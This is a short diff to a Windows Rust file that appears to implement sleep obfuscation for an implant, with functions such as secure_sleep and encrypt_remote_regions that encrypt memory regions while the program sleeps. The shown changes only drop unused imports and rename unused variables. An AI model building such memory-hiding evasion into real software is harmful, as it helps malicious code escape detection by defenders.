@@ -28,10 +28,7 @@
 #![cfg(windows)]
 
 use anyhow::{anyhow, Result};
-use chacha20::{
-    cipher::{KeyIvInit, StreamCipher},
-    XChaCha20,
-};
+use chacha20::cipher::KeyIvInit;
 use chacha20poly1305::{
     aead::{Aead, AeadInPlace, KeyInit, OsRng},
     XChaCha20Poly1305, XNonce,
@@ -1609,7 +1606,7 @@ pub unsafe fn secure_sleep(config: &SleepObfuscationConfig) -> Result<()> {
     for (base, size, orig_prot) in &raw_regions {
         let base = *base;
         let size = *size;
-        let orig_prot = *orig_prot;
+        let _orig_prot = *orig_prot;
 
         // Make writable.
         let actual_old = match protect_memory(base, size, PAGE_READWRITE) {
@@ -2310,7 +2307,7 @@ unsafe fn encrypt_remote_regions() {
         let mut encrypt_ok = true;
         while offset < size {
             let end = (offset + CHUNK_SIZE).min(size);
-            let chunk_len = end - offset;
+            let _chunk_len = end - offset;
 
             let chunk_slice = &buf[offset..end];
             let ct_tag = match cipher.encrypt(xnonce, chunk_slice as &[u8]) {
